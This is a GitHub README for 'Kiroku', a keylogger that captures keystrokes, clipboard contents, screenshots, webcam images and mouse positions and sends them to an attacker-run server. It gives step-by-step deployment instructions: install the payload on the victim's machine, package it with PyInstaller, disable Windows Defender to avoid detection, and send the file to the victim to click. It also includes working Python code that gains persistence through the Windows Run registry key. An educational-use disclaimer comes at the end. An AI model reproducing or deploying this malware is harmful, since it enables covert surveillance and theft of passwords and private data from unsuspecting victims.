# Kiroku Keylogger

![GIF](https://github.com/Kuraiyume/Kiroku/blob/main/kiroku.gif)

Kiroku Keylogger is a sophisticated tool designed for capturing and monitoring user activities on a target system. It collects information and transmits it to a remote server at regular intervals. 

## Payload Features

- **Keystroke Logging**: Captures all keystrokes, including special keys like Enter, Tab, and Backspace, and sends them to a specified server.
- **Clipboard Monitoring**: Continuously monitors clipboard content, detecting changes and sending the updated data to the server.
- **Screenshot Capture**: Takes screenshots at regular intervals and sends them to the server in a base64-encoded format.
- **Webcam Image Capture**: Takes webcam image at regular intervals and sends them to the server in a base64-encoded format also. (Not Compatible with Linux so we removed it)
- **Mouse Pointer Coordinate Capture**: Continuously monitors the position of the mouse pointer(cursor) based on Coordinates (x, y), detecting changes and sending the updated position to the server.
- **Modifier Key Tracking**: Tracks the state of Ctrl, Alt, and Shift keys to accurately capture key combinations.
- **Configurable Intervals**: Allows customization of the intervals for sending keystrokes, clipboard data, and screenshots.
- **JSON Payloads**: Packages keystrokes, clipboard data, and screenshots into JSON format for server transmission.
- **Threaded Execution**: Runs keystroke logging, clipboard monitoring, and screenshot capture in separate threads for efficient performance.
- **Automatic Transmission**: Periodically sends captured data to the server without user intervention.
- **Base64 Encoding**: Encodes screenshots in base64 format before transmission to reduce the payload size.
- **Platform Compatibility**: Designed to work seamlessly on multiple platforms with minimal configuration changes.

## Server Features

- **Keystroke Logging**: Receives and logs keystrokes from the payload, saving them to a specified file.
- **Clipboard Data Logging**: Captures clipboard content from the payload and saves them to a specified file. 
- **Screenshot Handling**: Receives base64-encoded screenshots from the payload, decodes them, and saves them as PNG files in a specified directory.
- **Webcam Handling**: Receives base64-encoded webcam images from the payload, decodes them, and saves them as a PNG files in a specified directory.
- **Mouse Pointer Coordinate Logging**: Captures mouse pointer coordinates from the payload and saves them to a specified file. 
- **Victim IP Logging**: Logs the IP address of the victim alongside captured data to identify the source.
- **JSON Parsing and Error Handling**: Parses incoming data in JSON format and handles errors like invalid JSON or server issues with detailed logging.
- **Customizable Configuration**: Allows customization of the server port, file paths for saved keystrokes, clipboard data, and screenshot storage directory.
- **Threaded Execution**: Handles incoming POST requests concurrently, ensuring smooth and efficient server performance.
- **Logging**: Provides detailed logging of all activities, including received data, errors, and server operations.
- **Session Persistence**: Automatically reconnects and continues sessions if the server is restarted while the payload is still running, ensuring uninterrupted data capture.
- **Interactive Use**: The server offers GUI Interface for more interactive and customizable listening.

## Installation && Usage

- **Clone the repository:**
  ```bash
  git clone https://github.com/Kuraiyume/Kiroku
  ```

- **Install the necessary libraries:**
  ```bash
  pip3 install -r requirements.txt
  ```
  *You will need to install this in the victim's machine*
  
- **On the attacker machine, run the server:**
  ```bash
  python3 server.py
  ```
  *If Tkinter is not installed, install it using 'sudo apt install python3-tk'*

- **On the victim device configure the payload and run the script:**
  ```bash
  python3 payload_windows.py
  ```
  *If your target is Linux machine:*
  ```bash
  python3 payload_linux.py
  ```

## How to make the payload run without the need of Python Interpreter?

- **You will need to install the required modules for the payload:**
  ```bash
  pip3 install -r requirements.txt
  ```
  *Ensure that all of the modules are installed!*

- **Configure the payload before we turn it to executable, change the server IP, Port, and the time intervals (if needed).**

- **We will use PyInstaller to convert our payload to a standalone executable (PyInstaller is included in the requirements.txt).**

- **We will use the 'payload.spec' file to convert our payload to executable, but first, configure it on how your executable should be packed based on your requirements.**

- **After Configuration, we will use PyInstaller along with the payload.spec to generate us an executable version of the payload:**
  ```bash
  pyinstaller payload_windows.spec
  ```
  *If your target is Linux machine:*
  ```bash
  pyinstaller payload_linux.spec
  ```
  
  *Make sure to build the executable on the same OS as the target system to avoid compatibility issues due to architecture differences.*
  *If you're building the executable on windows, you should turn off the Real-Time Protection in Windows Defender to avoid detection while building.*

- **Once the conversion is done, you will see a dist folder that's where your executable lives. Now all you need to do is run the server on the attacker's machine and send the executable to the victim and wait for the victim to click it, once clicked, the payload will do its work.**
  
  *Ensure all configurations made before the conversion are correct and match the attacker's machine setup.*

- **(Windows Only) If you want to make it persistent when you convert it to executable, you'll need to add a logic in the payload that can move itself to the windows registry when it's executable, Here's how you can do that:**
  1. Import the winreg and sys module to allow your payload to integrate with the registry and file system (sys):
     ```python
     import winreg
     import sys
     ```
  2. Add this function:
     ```python
     def add_to_registry():
         exe_path = sys.executable
         try:
             registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
             key_name = 'Kiroku'
             winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
             winreg.CloseKey(registry_key)
         except Exception as e:
             print(f"Failed to add executable to registry: {e}")
     ```
  3. Call the function to the main guard (AT THE BEGINNING):
     ```python
     if __name__ == "__main__":
         add_to_registry()
     ```
     
## Warning

This tool is intended strictly for educational purposes and ethical hacking only. Unauthorized use of this tool for malicious activities or without explicit consent is illegal and strictly prohibited.

- **Ethical Use Only:** Ensure that you have proper authorization before deploying or using this tool. It is meant to help understand security vulnerabilities and improve defenses, not to invade privacy or engage in unlawful activities.
- **Legal Compliance:** Be fully aware of and comply with all applicable laws and regulations in your jurisdiction. Misuse of this tool can result in severe legal consequences.
- **Responsibility:** The creator of this tool does not condone or support illegal activities. Use this tool responsibly and ethically to advance your knowledge and skills in cybersecurity.
  
Proceed with caution and integrity. Your actions reflect your respect for privacy and the law.

## License

- Kiroku is licensed under the GNU General Public License.

## Author

- Kuroshiro (A1SBERG)
